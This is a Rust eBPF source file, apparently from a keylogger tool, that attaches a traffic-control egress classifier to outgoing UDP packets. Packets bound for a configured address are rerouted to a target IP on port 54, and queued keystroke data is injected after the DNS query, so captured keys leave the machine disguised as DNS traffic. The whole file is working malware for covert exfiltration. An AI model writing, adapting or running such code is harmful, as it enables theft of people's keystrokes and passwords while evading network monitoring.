use core::net::Ipv4Addr;

use aya_ebpf::{
    bindings::TC_ACT_PIPE,
    helpers::{bpf_get_hash_recalc, bpf_set_hash_invalid},
    macros::{classifier, map},
    maps::PerCpuArray,
    programs::TcContext,
};
use aya_log_ebpf::{error, info};
// use flex_dns::DnsMessage;
use network_types::{
    eth::{EthHdr, EtherType},
    ip::{IpProto, Ipv4Hdr},
    udp::UdpHdr,
};

use crate::common::{
    inject_keys, load_bytes, log_csums, store_bytes, update_addr, update_ip_hdr_tot_len,
    update_port, update_udp_hdr_len, UpdateType, BPF_ADJ_ROOM_NET, DATA, DNS_QUERY_OFFSET,
    HIJACK_IP, TARGET_IP, UDP_DEST_PORT_OFFSET, UDP_OFFSET,
};

// Maps

const KEYS_PAYLOAD_LEN: usize = 16; // In bytes
const DNS_PAYLOAD_MAX_LEN: usize = 240; //power of 2 mandatory for masking
pub struct Buf {
    pub buf: [u8; DNS_PAYLOAD_MAX_LEN + KEYS_PAYLOAD_LEN],
}

#[map]
pub static DNS_BUFFER: PerCpuArray<Buf> = PerCpuArray::with_max_entries(1, 0);

#[classifier]
pub fn tamanoir_egress(mut ctx: TcContext) -> i32 {
    match tc_process_egress(&mut ctx) {
        Ok(ret) => ret,
        Err(_) => TC_ACT_PIPE,
    }
}

fn read_keys() -> [u32; KEYS_PAYLOAD_LEN / 4] {
    let key1 = DATA.pop().unwrap_or_default();
    let key2 = DATA.pop().unwrap_or_default();
    let key3 = DATA.pop().unwrap_or_default();
    let key4 = DATA.pop().unwrap_or_default();
    [key1, key2, key3, key4]
}

fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, ()> {
    let target_ip: u32 = unsafe { core::ptr::read_volatile(&TARGET_IP) };
    let hijack_ip: u32 = unsafe { core::ptr::read_volatile(&HIJACK_IP) };
    let ethhdr: EthHdr = ctx.load(0).map_err(|_| ())?;
    if let EtherType::Ipv4 = ethhdr.ether_type {
        let header = ctx.load::<Ipv4Hdr>(EthHdr::LEN).map_err(|_| ())?;
        let addr = header.dst_addr;
        if let IpProto::Udp = header.proto {
            if u32::from_be(addr) == hijack_ip {
                info!(ctx, "\n-----\nNew intercepted request:\n-----");

                let udp_hdr = &ctx.load::<UdpHdr>(UDP_OFFSET).map_err(|_| ())?;

                let dns_payload_len = (ctx.len() as usize)
                    .checked_sub(DNS_QUERY_OFFSET)
                    .ok_or(())?;

                if dns_payload_len < DNS_PAYLOAD_MAX_LEN {
                    let keys = read_keys();
                    info!(ctx, "Fetch keys from the queue");

                    let buf = unsafe {
                        let ptr = DNS_BUFFER.get_ptr_mut(0).ok_or(())?;
                        &mut (*ptr).buf
                    };
                    load_bytes(ctx, DNS_QUERY_OFFSET, buf).map_err(|_| ())?;

                    log_csums(ctx);
                    update_addr(ctx, &addr, &target_ip.to_be(), UpdateType::Dst)?;
                    update_ip_hdr_tot_len(
                        ctx,
                        &header.tot_len,
                        &(u16::from_be(header.tot_len) + KEYS_PAYLOAD_LEN as u16).to_be(),
                    )?;

                    //make room
                    info!(ctx, "adjust room");
                    ctx.skb
                        .adjust_room(KEYS_PAYLOAD_LEN as i32, BPF_ADJ_ROOM_NET, 0)
                        .map_err(|_| {
                            error!(ctx, "error adjusting room");
                        })?;

                    // move udp header
                    ctx.store(UDP_OFFSET, &udp_hdr, 0).map_err(|_| {
                        error!(ctx, "error shifting udp header ");
                    })?;

                    update_udp_hdr_len(
                        ctx,
                        &(u16::from_be(udp_hdr.len) + KEYS_PAYLOAD_LEN as u16).to_be(),
                    )?;

                    update_port(ctx, &53u16.to_be(), &54u16.to_be(), UpdateType::Dst)?;

                    //move dns payload
                    let buf = unsafe {
                        let ptr = DNS_BUFFER.get_ptr(0).ok_or(())?;
                        &(*ptr).buf
                    };
                    info!(ctx, "injecting dns payload  @{}  ", DNS_QUERY_OFFSET);
                    store_bytes(ctx, DNS_QUERY_OFFSET, buf, 0).map_err(|_| ())?;

                    // ctx.store(DNS_QUERY_OFFSET, &buf, 0).map_err(|_| {
                    //     error!(ctx, "error shifting dns payload ");
                    // })?;

                    inject_keys(ctx, DNS_QUERY_OFFSET + dns_payload_len, keys)?;

                    //recompute checksum layer 4
                    //set current csum to 0
                    // ctx.store(UDP_CSUM_OFFSET, &0u16, 2).map_err(|_| {
                    //     error!(ctx, "error zeroing L4 csum");
                    // })?;

                    // let udp_hdr_bytes = &ctx.load::<[u8; 8]>(UDP_OFFSET).map_err(|_| ())?;
                    // let buf = unsafe {
                    //     let ptr = DNS_BUFFER.get_ptr_mut(0).ok_or(())?;
                    //     &mut (*ptr).buf
                    // };
                    // load_bytes(ctx, DNS_QUERY_OFFSET, buf).map_err(|_| ())?;

                    // let new_cs = calculate_udp_checksum(
                    //     ctx,
                    //     u32::from_be(header.src_addr),
                    //     u32::from_be(target_ip),
                    //     udp_hdr_bytes,
                    //     buf,
                    //     DNS_PAYLOAD_MAX_LEN + KEYS_PAYLOAD_LEN,
                    //     dns_payload_len + KEYS_PAYLOAD_LEN,
                    // );

                    // info!(ctx, "NEW CS: {}", new_cs);
                    // ctx.store(UDP_CSUM_OFFSET, &new_cs.to_be(), 2)
                    //     .map_err(|_| {
                    //         error!(ctx, "error reseting L4 csum");
                    //     })?;

                    unsafe {
                        bpf_set_hash_invalid(ctx.skb.skb);
                        bpf_get_hash_recalc(ctx.skb.skb);
                    }

                    info!(
                        ctx,
                        "{}:{} -> {}:{}",
                        Ipv4Addr::from_bits(addr),
                        53,
                        Ipv4Addr::from_bits(u32::from_be(
                            (ctx.load::<Ipv4Hdr>(EthHdr::LEN).unwrap()).dst_addr,
                        )),
                        u16::from_be(ctx.load::<u16>(UDP_DEST_PORT_OFFSET).unwrap())
                    );
                };
            }
        };
    }

    Ok(TC_ACT_PIPE)
}
